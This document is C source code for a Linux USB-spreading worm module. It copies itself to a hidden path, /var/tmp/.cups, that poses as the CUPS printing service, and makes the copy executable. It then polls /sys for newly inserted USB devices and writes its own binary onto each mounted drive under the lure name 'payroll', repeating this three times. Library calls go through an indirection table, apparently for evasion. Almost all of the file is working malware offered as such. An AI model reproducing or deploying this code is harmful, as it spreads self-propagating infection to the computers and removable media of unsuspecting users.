#include "unix_usb_spreader.h"

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#define POLL_INTERVAL 10
//static const char *EXECUTABLE_SYSPATH = "/var/tmp/.cups";
#define EXECUTABLE_SYSPATH "/var/tmp/.cups"

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/limits.h>
#include <string.h>

#include <sys/sysmacros.h>
#include <time.h>

#include <errno.h>
#include "utils.h"

#define SYS_USB_PATH "/sys/bus/usb/devices"

//#####START string_utils.c#####

char *findSubstring(char* string, char *substr) {
    char* whereIsIt = global->strstr(string, substr);
    
    return whereIsIt;
}

char *concat(const char *s1, const char *s2) {
    char *result = (char *) global->malloc(global->strlen(s1) + global->strlen(s2) + 1);
    if (result == NULL) {
        DEBUG_LOG_ERR("[USB] concat strings error alloc mem\n");
        return NULL;
    }

    global->strcpy(result, s1);
    global->strcat(result, s2);
    return result;
}

//#####END string_utils.c#####
//#####START file.c#####

char *readfile(const char* filename) {
    FILE * f = global->fopen(filename, "r");
    if (f == NULL) {
        DEBUG_LOG_ERR("[USB] fail to open the file\n");
        return NULL;
    }

    global->fseek(f, 0, SEEK_END);
    int file_size = global->ftell(f);
    global->rewind(f);

    char* content = (char *)global->malloc(file_size + 1);
    if (content == NULL) {
        DEBUG_LOG_ERR("[USB] fail to alloc mem while read file\n");

        global->free(content);
        global->fclose(f);
        return NULL;
    }

    size_t readBytes = global->fread(content, 1, file_size, f);
    if (readBytes != file_size) {
        DEBUG_LOG_ERR("[USB] fail to read the file\n");
        global->free(content);
        global->fclose(f);
        return NULL;
    }

    content[readBytes] = '\0';

    global->fclose(f);

    return content;
}

char *readVirtualFile(const char *filename) {
    FILE *f = global->fopen(filename, "r");
    if (f == NULL) {
        DEBUG_LOG_ERR("[USB] fail to open the file\n");
        return NULL;
    }

    size_t buffer_size = 1024;
    size_t content_size = 0;
    char *content = global->malloc(buffer_size);
    if (content == NULL) {
        DEBUG_LOG_ERR("[USB] fail to alloc mem while read file\n");
        global->fclose(f);
        return NULL;
    }

    size_t bytesRead;
    while ((bytesRead = global->fread(content + content_size, 1, buffer_size - content_size - 1, f)) > 0) {
        content_size += bytesRead;
        if (content_size >= buffer_size - 1) {
            buffer_size *= 2;
            content = global->realloc(content, buffer_size);
            if (content == NULL) {
                DEBUG_LOG_ERR("[USB] fail to realloc memory reading virtual file\n");
                global->fclose(f);
                return NULL;
            }
        }
    }

    if (global->ferror(f)) {
        DEBUG_LOG_ERR("[USB] fail to read virtual file\n");
        global->free(content);
        global->fclose(f);
        return NULL;
    }

    content[content_size] = '\0';  // Null-terminate the string
    global->fclose(f);
    return content;
}

char *readBinaryFile(const char* filename, size_t *fileSize) {
    FILE * f = global->fopen(filename, "rb");
    if (f == NULL) {
        DEBUG_LOG_ERR("[USB] fail to open the binary file\n");
        return NULL;
    }

    global->fseek(f, 0, SEEK_END);
    *fileSize = global->ftell(f);
    global->rewind(f);

    char* content = (char *)global->malloc(*fileSize + 1);
    if (content == NULL) {
        DEBUG_LOG_ERR("[USB] fail to open alloc memory while read binary file\n");
        global->free(content);
        global->fclose(f);
        return NULL;
    }

    size_t readBytes = global->fread(content, 1, *fileSize, f);
    if (readBytes != *fileSize) {
        DEBUG_LOG_ERR("[USB] fail to read binary file\n");
        global->free(content);
        global->fclose(f);
        return NULL;
    }

    content[readBytes] = '\0';

    global->fclose(f);

    return content;
}

bool isSymLink(const char* filename) {
    struct stat fileStat;

    if (global->lstat(filename, &fileStat) == -1) {
        return false;
    }
   
    if (S_ISLNK(fileStat.st_mode)) {
        return true;
    }
    return false;
}

char *followSymLink(char* filename) {
    char buf[PATH_MAX]; 
    size_t len = global->readlink(filename, buf, sizeof(buf)-1); //not null-terminated
    if (len < 0) {
        DEBUG_LOG_ERR("[USB] fail to read symlink\n");
        return NULL;
    }

    buf[len] = '\0';

    if (buf[0] != '/') {
        //resolve relative path
        char *absolutePath = global->realpath(filename, NULL);

        if (absolutePath == NULL) {
            DEBUG_LOG_ERR("[USB] fail to resolve realpath of symlink\n");
            return NULL;
        }

        len = global->strlen(absolutePath);
        global->strncpy(buf, absolutePath, len);
        buf[len] = '\0';
    }

    char *resolvedPath = global->malloc(len+1);
    if (resolvedPath == NULL) {
        return NULL;
    }

    global->strcpy(resolvedPath, buf);
    //free(filename);

    return resolvedPath;
}

int writeFile(char* fileContent, const char* destDir, const char *fileName) { //if file already existed with same content, this is idempotent
    size_t dir_len = global->strlen(destDir);
    size_t file_len = global->strlen(fileName);
    size_t total_len = dir_len + file_len + 2;  //null-byte + the "/"

    char *fullPath = (char *)global->malloc(total_len);
    if (fullPath == NULL) {
        DEBUG_LOG_ERR("[USB] fail to alloc memory writing file\n");
        return -1;
    }

    // Combine directory and filename with a '/' in between
    global->snprintf(fullPath, total_len, "%s/%s", destDir, fileName);
    
    FILE *fd = global->fopen(fullPath, "w");
    if (fd == NULL) {
        global->free(fullPath);
        DEBUG_LOG_ERR("[USB] fail to opening the file for writing\n");
        return -1;
    }
    global->fprintf(fd, fileContent);
    global->fclose(fd);
    global->free(fullPath);
    return 0;
}

int writeBinaryFile(char* fileContent, const char* destDir, const char *fileName, size_t fileSize) {
    size_t dir_len = global->strlen(destDir);
    size_t file_len = global->strlen(fileName);
    size_t total_len = dir_len + file_len + 2;  //null-byte + the "/"

    char *fullPath = (char *)global->malloc(total_len);
    if (fullPath == NULL) {
        DEBUG_LOG_ERR("[USB] fail to alloc memory writing to bin file\n");
        return -1;
    }

    // Combine directory and filename with a '/' in between
    global->snprintf(fullPath, total_len, "%s/%s", destDir, fileName);
    
    FILE *fd = global->fopen(fullPath, "wb");
    if (fd == NULL) {
        global->free(fullPath);
        DEBUG_LOG_ERR("[USB] fail to open the file while writing to bin file\n");
        return -1;
    }

    size_t writtenBytes = global->fwrite(fileContent, 1, fileSize, fd);
    if (writtenBytes != fileSize) {
        DEBUG_LOG_ERR("[USB] fail to write bytes in bin file\n");
        global->fclose(fd);
        global->free(fullPath);
        return -1;
    }

    global->fclose(fd);
    global->free(fullPath);
    return 0;
}


struct dirent **listDir(const char *path, int *count) {
    if (count == NULL) {
        return NULL;
    }

    DIR *d;
    struct dirent *dir;
    struct dirent **dirList = NULL;
    int dirCount = 0;

    d = global->opendir(path);
    if (d == NULL) {
        return NULL;
    }

    while ((dir = global->readdir(d)) != NULL) {
        struct dirent *new_entry = global->malloc(sizeof(struct dirent));
        if (new_entry == NULL) {
            // Cleanup, abort
            for (int i = 0; i < dirCount; i++) {
                global->free(dirList[i]);
            }
            global->free(dirList);
            global->closedir(d);
            return NULL;
        }

        *new_entry = *dir;
        struct dirent **tmpList = global->realloc(dirList, (dirCount + 1) * sizeof(struct dirent *));
        if (tmpList == NULL) {
            // Cleanup, abort
            global->free(new_entry);
            for (int i = 0; i < dirCount; i++) {
                global->free(dirList[i]);
            }
            global->free(dirList);
            global->closedir(d);
            return NULL;
        }

        dirCount++;
        dirList = tmpList;
        dirList[dirCount] = new_entry;
    }
    global->closedir(d);

    *count = dirCount;
    return dirList;
}

bool fileExists(const char *path) {
    struct stat buf;
    if (global->stat(path, &buf) == 0) {
        return true;
    };
    return false;
}

int getUSBSysDevices(char devices[][256], int max_devices) {
    struct dirent *entry;
    DIR *dir = global->opendir(SYS_USB_PATH);
    if (!dir) {
        DEBUG_LOG_ERR("[USB] fail to open /sys usb devices directory\n");
        return -1;
    }

    int count = 0;
    while ((entry = global->readdir(dir)) != NULL) {
        // Skip paths ".", ".."
        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
            if (count < max_devices) {
                global->strncpy(devices[count], entry->d_name, 256);
                count++;
            }
        }
    }
    global->closedir(dir);
    return count;
}

int compareDeviceLists(char old_devices[][256], int old_count, char new_devices[][256], int new_count) {
    int deviceWasAdded = 0;
    // detect added devices
    for (int i = 0; i < new_count; i++) {
        int found = 0;
        for (int j = 0; j < old_count; j++) {
            if (global->strcmp(new_devices[i], old_devices[j]) == 0) {
                found = 1;
                break;
            }
        }
        if (!found) {
            char debugMsg[256];
            global->snprintf(debugMsg, sizeof(debugMsg), "device was added: %s", new_devices[i]);
            DEBUG_LOG("[USB] Device added: %s\n", new_devices[i]);
            deviceWasAdded = 1;
        }
    }

    // detect removed devices, not needed anymore
    for (int i = 0; i < old_count; i++) {
        int found = 0;
        for (int j = 0; j < new_count; j++) {
            if (global->strcmp(old_devices[i], new_devices[j]) == 0) {
                found = 1;
                break;
            }
        }
        //if (!found) {
        //    printf("Device removed: %s\n", old_devices[i]);
        //}
    }
    return deviceWasAdded;
}

//######END files.c#####
//#####START mount_info_node.c#####

Node *createNode(Mounts info) {
    Node *newNode = global->malloc(sizeof(Node));
    if (!newNode) {
        DEBUG_LOG_ERR("[USB] fail to alloc memory for mount createnode\n");
        return NULL;
    }

    newNode->mount = info;
    newNode->prev = NULL;
    newNode->next = NULL;
    return newNode;
}

void appendNode(Node **head, Node **tail, Mounts data) {
    Node *newNode = createNode(data);
    if (*tail == NULL) {
        *head = newNode;
        *tail = newNode;
    } else {
        newNode->prev = *tail;
        newNode->next = NULL; //redundante
        (*tail)->next = newNode;
        *tail = newNode;
    }
}

void deleteNode(Node **head, Node **tail, int position) {
    if (*head == NULL) {
        return;
    }

    Node *current = *head;
    int index = 0;

    // Go to specified position
    while (current != NULL && index < position) {
        current = current->next;
        index++;
    }

    if (current == NULL) {
        return;
    }

    // If the node to be deleted is the head
    if (*head == current) {
        *head = current->next;
        if (*head ==  NULL) {
            //there was only 1 element
            *head = NULL; //redundant
            *tail = NULL;
        } else {
            (*head)->prev = NULL;
        }
    } else if (*tail == current) {
        // node is in the tail
      *tail = current->prev;
      (*tail)->next = NULL;
    } else {
        //node in the middle
        (current->prev)->next = current->next;
        (current->next)->prev = current->prev;
    }

    global->free(current);
}

Mounts* listToArr(Node* head, Node* tail, size_t *countArr) {
    size_t count = 0;
    Node* current = head;
    
    while (current != NULL) {
        count++;
        current = current->next;
    }

    *countArr = count;

    Mounts* arr = (Mounts *) global->malloc(count * sizeof(Mounts));
    if (!arr) {
        DEBUG_LOG_ERR("[USB] fail to alloc mem for mounts list\n");
        return NULL;
    }

    size_t i = 0;
    current = head;
    while (current != NULL) {
        arr[i] = current->mount;
        i++;
        current = current->next;
    }

    return arr;    
}

//#####END mount_info_node.c#####
//######START mount_info.c#####

bool isUSBMount(char* devPath, char* mountPath) {
    char* pathToMatch = "/dev/sd";

    char *whereIsIt = findSubstring(devPath, pathToMatch);
    if (whereIsIt != NULL && devPath == whereIsIt) {
        //contains pathToMatch, and it's at the beginning

        char rootDir[2] = "/";
        char homeDir[6] = "/home";
        char *isHomeDir = findSubstring(mountPath, homeDir);
        if(global->strncmp(mountPath, rootDir, sizeof(rootDir)) == 0 || isHomeDir != NULL) {
            return false;
        }
        return true;
    }
    
    return false;
}

Mounts* parseMountLine(char* line) {
    Mounts* mountInfo = (Mounts *) global->malloc(sizeof(Mounts));
    int i = 0;
    char* rawMountLineInfo = global->strtok(line, " ");
    while (rawMountLineInfo != NULL) {
        i++;
        switch (i) {
        case 1:
            global->strncpy(mountInfo->device, rawMountLineInfo, sizeof(mountInfo->device)); //for now ignore if atoi return 0
            break;
        case 2:
            global->strncpy(mountInfo->mountPoint, rawMountLineInfo, sizeof(mountInfo->mountPoint));
            break;
        case 3:
            global->strncpy(mountInfo->fsType, rawMountLineInfo, sizeof(mountInfo->fsType));
            break;
        case 4:
            global->strncpy(mountInfo->permissions, rawMountLineInfo, sizeof(mountInfo->permissions));
            break;
        case 5:
            mountInfo->dummy1 = global->atoi(rawMountLineInfo);
            break;
        case 6:
            mountInfo->dummy2 = global->atoi(rawMountLineInfo);
            break;
        }
        rawMountLineInfo = global->strtok(NULL, " ");
    }
    
    return mountInfo;
}

Mounts* parseMountsFile(size_t *arrSize) {
    char *procMountPath = "/proc/mounts";
    if (!fileExists(procMountPath)) {
        procMountPath = "/etc/mtab";
    }

    while (isSymLink(procMountPath)){
        char *resolvedProcMountPath = procMountPath;
        procMountPath = followSymLink(resolvedProcMountPath);
    }

    char* fileContent = readVirtualFile(procMountPath);
    if (!fileContent) {
        DEBUG_LOG_ERR("[USB] fail to read virtual file\n");
        return NULL;
    }

    char *lineCtx;
    char* line = global->__strtok_r(fileContent, "\n", &lineCtx);
    Node *headSysMounts = NULL;
    Node *tailSysMounts = NULL;
    while (line != NULL) {
        Mounts *mountInfo = parseMountLine(line);
        if (mountInfo == NULL) {
            DEBUG_LOG_ERR("[USB] invalid mount line parsed, should not happen\n");
        } else {
            appendNode(&headSysMounts, &tailSysMounts, *mountInfo);
        }
        line = global->__strtok_r(NULL, "\n", &lineCtx);
    }

    Mounts* mounts = listToArr(headSysMounts, tailSysMounts, arrSize);
    
    return mounts;
}

//#####END mount_info.c#####

// From here starts the main file, unix_usb_spreader.c

bool isFromMalwarePath(char *argZero) {
    return global->strncmp(EXECUTABLE_SYSPATH, argZero, global->strlen(EXECUTABLE_SYSPATH)) == 0;
}


int copyToMwareSysPath(char *currentMalwarePath) {
    size_t malwareFileSize;

    char *rawMalwareContent = readBinaryFile(currentMalwarePath, &malwareFileSize);
    if (rawMalwareContent == NULL) {
        DEBUG_LOG_ERR("[USB] unable to read self exec binary\n");
        return -1;
    }

    int statusCode = writeBinaryFile(rawMalwareContent, "/var/tmp", ".cups", malwareFileSize);
    if (statusCode != 0) {
        DEBUG_LOG_ERR("[USB] unable to copy malware to system path\n");
        return statusCode;
    }

    // Ensure the copied file is executable
    if (global->chmod("/var/tmp/.cups", 0755) < 0) {
        DEBUG_LOG_ERR("[USB] fail to chmod malware in syspath\n");
        return -1;
    }

    return 0;
}

int spreadUSBs(const char* malwareFileName) {
    size_t countMounts = 0;
    Mounts* mounts = parseMountsFile(&countMounts);
    if (!mounts) {
        DEBUG_LOG_ERR("[USB] unable to parse mount information");
        return -1;
    }

    int i;  

    int countUsbMounts = 0;
    // filter out non-usb mounts
    for (i = 0; i < countMounts; i++) {
        if (isUSBMount(mounts[i].device, mounts[i].mountPoint)) {
            countUsbMounts++;
        }
    }

    int j = 0;
    Mounts *usbMounts = (Mounts *) global->malloc(countUsbMounts * sizeof(Mounts));
    if (usbMounts == NULL) {
        DEBUG_LOG_ERR("[USB] unable to alloc memory for usb mounts\n");
        return -1;
    }
    for (i = 0; i < countMounts; i++) {
        if (isUSBMount(mounts[i].device, mounts[i].mountPoint)) {
            usbMounts[j] = mounts[i];
            j++;
        }
    }

    char* malwareContent = readfile(EXECUTABLE_SYSPATH);
    if (malwareContent == NULL) {
        DEBUG_LOG_ERR("[USB] fail to read malware content\n");
        return -1;
    }
    
    //infection process
    for (j = 0; j < countUsbMounts; j++) {
        if (writeFile(malwareContent, usbMounts[j].mountPoint, malwareFileName) != 0) {
            char errMsg[300];
            global->snprintf(errMsg, global->strlen(errMsg), "[USB] failed to write file in %s, but still continuing\n", usbMounts[j].mountPoint);
            DEBUG_LOG_ERR(errMsg);
        }
    }
    
    global->free(mounts);
    global->free(usbMounts);

    return 0;
}

int startUSBInfector(char *argZero) {
    char oldDevices[128][256];
    char newDevices[128][256];
    int oldCount = 0;
    char *usbFileName = "payroll";

    // Get the initial list of devices
    oldCount = getUSBSysDevices(oldDevices, 128);

    while (1) {
        global->sleep(POLL_INTERVAL);

        // Get the new list of devices
        int newCount = getUSBSysDevices(newDevices, 128);

        if (newCount == -1) {
            DEBUG_LOG_ERR("[USB] fail to read usb devices in /sys\n");
            break;
        }

        // Compare old and new lists
        int deviceWasAdded = compareDeviceLists(oldDevices, oldCount, newDevices, newCount);
        if (deviceWasAdded) {
            //give some time for the device to be automatically mounted, or mounted by the user
            DEBUG_LOG("[USB] Device was added, infecting and waiting 10s\n");
            spreadUSBs(usbFileName);
            global->sleep(10);
            DEBUG_LOG("[USB] Infecting again, waiting 60s\n");
            spreadUSBs(usbFileName);
            global->sleep(60);
            DEBUG_LOG("[USB] Last infection\n");
            spreadUSBs(usbFileName);
        }

        // Update the old list
        global->memcpy(oldDevices, newDevices, sizeof(newDevices));
        oldCount = newCount;
    }

    return 0;
}

int usb_spread_module(Globals * glob) {
    global = glob;

    int statusCode = 0;
    char *executedFromFilename = global->malware_path;

    if (isFromMalwarePath(executedFromFilename)) {
        DEBUG_LOG("[USB] Starting infect loop\n");
        statusCode = startUSBInfector(executedFromFilename);
    } else {
        DEBUG_LOG("[USB] WARNING, Copying malware to system path and running it, BUT FROM THE USB MODULE. THIS SHOULD NOT HAPPEN...\n");
        statusCode = copyToMwareSysPath(executedFromFilename);
        if (statusCode != 0) {
            DEBUG_LOG_ERR("[USB] fail to copy malware to system path\n");
        }

        statusCode = global->execl(EXECUTABLE_SYSPATH, EXECUTABLE_SYSPATH, NULL);
        if (statusCode != 0) {
            DEBUG_LOG_ERR("[USB] fail to execute binary in EXECUTABLE PATH\n");
        }
    }

    return statusCode;
}
